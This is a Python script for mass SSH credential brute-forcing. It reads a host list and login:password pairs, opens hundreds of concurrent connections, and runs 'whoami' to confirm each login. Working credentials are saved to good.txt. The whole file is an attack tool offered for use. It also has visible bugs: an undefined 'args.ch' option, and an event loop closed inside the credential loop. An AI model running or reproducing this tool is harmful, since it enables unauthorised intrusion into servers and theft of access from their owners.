import asyncio
import argparse
from itertools import islice
from asyncssh import connect
import re
import time
from asyncssh.misc import ConnectionLost, PermissionDenied, ProtocolNotSupported, ChannelOpenError,\
    ProtocolError

index = 0

def parse_args():
    parser = argparse.ArgumentParser(description='Bruteforce SSH')
    parser.add_argument('path', type=str)
    parser.add_argument('-c', '--connections',  type=int, default=250)
    parser.add_argument('-t', '--timeout', type=int, default=7, help='timeout')
    return parser.parse_args()


def get_index():
    global index
    index += 1
    return index


def load_credentials():
    with open('pass.txt') as file:
        return [(line.split(':')[0], line.split(':')[1].strip()) for line in file.readlines()]


def load_hosts():
    with open(args.path) as file:
        for line in file:
            yield ''.join(re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line))


def save_result(file, fh, ip, login, password):
    print(f'{ip}|{login}:{password}', file=fh[file])
    print(f'[{get_index()}]\t\t[{file}]\t\t{ip}')


def chunks(n, iterable):
    i = iter(iterable)
    piece = list(islice(i, n))
    while piece:
        yield piece
        piece = list(islice(i, n))




def open_files():
    files = {'good': open('good.txt', 'w'),
             'bad': open('bad.txt', 'w'),
             'wrong': open('wrong.txt', 'w'),}
    return files


def close_files(file_handle):
    for file in file_handle:
        file_handle[file].close()


async def make_connection(ip, login, password):
    try:
        async with connect(ip, username=login, password=password, known_hosts=None) as conn:
            whoami = await conn.run('whoami', check=True, timeout=args.timeout)
            if whoami.stdout.strip().lower() == login:
                if args.ch:
                    df = await conn.run('df', check=True, timeout=args.timeout)
                return 0
    except (ConnectionRefusedError, TimeoutError, ConnectionResetError):
        return 1
    except (ProtocolError, ConnectionLost, ProtocolNotSupported, ChannelOpenError):
        return 1
    except PermissionDenied:
        return 2
    except Exception:
        return 1


async def work(ip, login, password, fh):
    async with semaphore:
        try:
            result = await asyncio.wait_for(make_connection(ip, login, password), timeout=args.timeout)

            if result == 1:
                save_result('bad', fh, ip, login, password)
            if result == 2:
                save_result('wrong', fh, ip, login, password)
            if result == 0:
                save_result('good', fh, ip, login, password)

        except asyncio.TimeoutError:
            save_result('bad', fh, ip, login, password)


async def run(targets, login, password, fh):
    print(f'Go {len(targets)} to check')
    print(f'Cheking now for {login}:{password}')
    tasks = []
    for target in targets:
        tasks.append(work(target, login, password, fh))
    await asyncio.gather(*tasks)


def main():
    fh = open_files()
    for login, password in load_credentials():
        targets = chunks(100000, load_hosts())
        for chunk in targets:
            future = asyncio.ensure_future(run(chunk, login, password, fh))
            loop = asyncio.get_event_loop()
            loop.run_until_complete(future)
            loop.close()
    close_files(fh)

if __name__ == '__main__':
    args = parse_args()
    semaphore = asyncio.Semaphore(args.connections)
    main()